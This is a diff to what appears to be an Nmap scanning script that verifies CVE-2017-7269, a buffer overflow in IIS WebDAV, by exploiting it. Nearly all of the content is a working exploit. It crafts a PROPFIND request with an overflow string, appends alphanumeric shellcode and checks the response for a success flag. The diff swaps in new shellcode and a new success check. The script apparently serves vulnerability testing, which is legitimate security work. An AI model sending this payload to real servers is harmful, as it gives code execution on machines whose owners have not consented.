@@ -27,21 +27,25 @@ local vulns = require "vulns"
 -- |
 -- |    References:
 -- |     https://github.com/edwardz246003/IIS_exploit,
+-- |     https://github.com/lcatro/CVE-2017-7269-Echo-PoC,
 -- |_    https://0patch.blogspot.in/2017/03/0patching-immortal-cve-2017-7269.html
 --
 
 author = {
-  "Zhiniang Peng", -- Original author
-  "Chen Wu",       -- Original author
-  "Rewanth Cool"   -- NSE script author
+  "Zhiniang Peng",       -- Original author
+  "Chen Wu",             -- Original author
+  "LCatro",              -- Exploit author
+  "Rewanth Cool",        -- NSE script author
+  "Samy Kacimi",         -- NSE script contributor
+  "Maxime Alay-Eddine"   -- NSE script contributor
 }
 license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
 categories = {"exploit", "vuln", "intrusive"}
 
-portrule = shortport.portnumber(80, "tcp")
+portrule = shortport.http
 
 action = function(host, port)
-  local socket, response, try, catch, payload, shellcode, vulnerable_name
+  local socket, response, try, catch, payload, shellcode
 
   local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
   local vuln = {
@@ -70,22 +74,20 @@ Original exploit by Zhiniang Peng and Chen Wu.
     }
   }
 
-  -- If domain name doesn't exist this line of code takes ip into consideration
-  vulnerable_name = host.targetname or host.ip
-
-  socket = nmap.new_socket()
+  socket = nmap.new_socket("tcp")
+  socket:set_timeout(10000)
   catch = function()
     socket:close()
   end
 
   try = nmap.new_try(catch)
-  try(socket:connect(host, port))
+  try(socket:connect(host, port, "tcp"))
 
   -- Crafting the payload by parts
 
   -- Crafting the request with HTTP PROPFIND method
-  payload = 'PROPFIND / HTTP/1.1\r\nHost: ' .. vulnerable_name .. '\r\nContent-Length: 0\r\n'
-  payload = payload .. 'If: <http://' .. vulnerable_name .. '/aaaaaaa'
+  payload = 'PROPFIND / HTTP/1.1\r\nHost: localhost:' .. port.number .. '\r\nContent-Length: 0\r\n'
+  payload = payload .. 'If: <http://localhost:' .. port.number .. '/aaaaaaa'
 
   -- Random text added to payload (Can be modified only for experimental purposes)
   payload = payload .. '\xe6\xbd\xa8\xe7\xa1\xa3\xe7\x9d\xa1\xe7\x84\xb3\xe6\xa4\xb6\xe4\x9d\xb2\xe7\xa8\xb9\xe4\xad\xb7\xe4\xbd'
@@ -110,7 +112,7 @@ Original exploit by Zhiniang Peng and Chen Wu.
   payload = payload .. '\xa5\x81\xe7\xa9\x90\xe4\xa9\xac'
 
   payload = payload .. '>'
-  payload = payload .. ' (Not <locktoken:write1>) <http://' .. vulnerable_name .. '/bbbbbbb'
+  payload = payload .. ' (Not <locktoken:write1>) <http://localhost:' .. port.number .. '/bbbbbbb'
 
   -- Random text added to payload (Can be modified only for experimental purposes)
   payload = payload .. '\xe7\xa5\x88\xe6\x85\xb5\xe4\xbd\x83\xe6\xbd\xa7\xe6\xad\xaf\xe4\xa1\x85\xe3\x99\x86\xe6'
@@ -139,11 +141,12 @@ Original exploit by Zhiniang Peng and Chen Wu.
 
   -- Shellcode
   shellcode = 'VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABA'
-  shellcode = shellcode .. 'BAB30APB944JB6X6WMV7O7Z8Z8Y8Y2TMTJT1M017Y6Q01010ELSKS0ELS3SJM0K7T0J061K4K6U7W5KJLOLMR5ZNL0ZMV5L5LMX1ZLP0V'
-  shellcode = shellcode .. '3L5O5SLZ5Y4PKT4P4O5O4U3YJL7NLU8PMP1QMTMK051P1Q0F6T00NZLL2K5U0O0X6P0NKS0L6P6S8S2O4Q1U1X06013W7M0B2X5O5R2O0'
-  shellcode = shellcode .. '2LTLPMK7UKL1Y9T1Z7Q0FLW2RKU1P7XKQ3O4S2ULR0DJN5Q4W1O0HMQLO3T1Y9V8V0O1U0C5LKX1Y0R2QMS4U9O2T9TML5K0RMP0E3OJZ'
-  shellcode = shellcode .. '2QMSNNKS1Q4L4O5Q9YMP9K9K6SNNLZ1Y8NMLML2Q8Q002U100Z9OKR1M3Y5TJM7OLX8P3ULY7Y0Y7X4YMW5MJULY7R1MKRKQ5W0X0N3U1'
-  shellcode = shellcode .. 'KLP9O1P1L3W9P5POO0F2SMXJNJMJS8KJNKPA'
+  shellcode = shellcode .. 'BAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJIOPKSKPKPTKLITKKQDKU0G0KPKPM00QQXI8KPM0M0K8KPKPKPM0QNTKKNU397N30WRJLMSSI7LNR72JPTK'
+  shellcode = shellcode .. 'OXPZKQH0CR615NMNRP0NQNWNMOGP206NYKPOSRORN3D35RND4NMPTD9RP2ENZMPT4352XCDNOS8BTBMBLLMKZOSROBN441URNT4NMPL2ERNS7SDBHOJOBN'
+  shellcode = shellcode .. 'VO0LMLJLMKZ0HOXOY0TO0OS260ENMNRP0NQOGNMOGOB06OIMP2345RCS3RET3D3M0KLK8SRM0KPM0C0SYK5NQWP2DDK0PNP4KQBLLTKQBMDDKD2MXLOGG0'
+  shellcode = shellcode .. 'JO6NQKO6LOLQQSLKRNLMP7QXOLMM18G9RJRR2R74KQBLP4K0JOL4K0LN1RXK3PHKQHQ0Q4K29MPM19CTKQ9MH9SOJQ94KNTTKKQJ6P1KOFLY1XOLMKQXGN'
+  shellcode = shellcode .. 'X9PD5KFM33MKHOKSMO42UJDPXTKB8O4KQIC1V4KLL0K4K0XMLKQXSTKKTTKKQJ0CYQ4O4MTQKQK1QR90Z0QKOYPQOQOQJ4KLRJKTM1MWKOWMCBR2OQZKPP'
+  shellcode = shellcode .. 'SKOYEKPA'
 
   payload = payload .. shellcode
   payload = payload .. '>\r\n\r\n'
@@ -154,24 +157,12 @@ Original exploit by Zhiniang Peng and Chen Wu.
   -- We receive a 200 response if the payload succeeds.
   response = try(socket:receive_bytes(80960))
   socket:close()
-
-  -- Checking for 200 response in the response
-  local regex = "HTTP/1.1 (%d+)"
-  local status = string.match(response, regex)
-
-  if status == '200' then
-    -- Buffer overflow is successfully executed on the server.
-    vuln.state = vulns.STATE.EXPLOIT,
-    vuln.exploit_results = response
-  elseif status == '400' then
-    -- Bad request error is occured because webdav is not installed.
-    vuln.state = vulns.STATE.LIKELY_VULN,
-    vuln.exploit_results = "Server returned 400: Install webdav and try again."
-  elseif status == '502' then
-    -- Likely to have an error in the Server Name
-    vuln.state = vulns.STATE.LIKELY_VULN,
-    vuln.exploit_results = "Server returned 502: Please try to change ServerName and run the exploit again"
-  elseif status ~= nil then
+  
+  -- Checking for flag in the response
+  local flag = 'HHIT CVE%-2017%-7269 Success'
+  
+  if string.match(response, flag) then
+    vuln.state = vulns.STATE.EXPLOIT
     vuln.exploit_results = response
   end
 
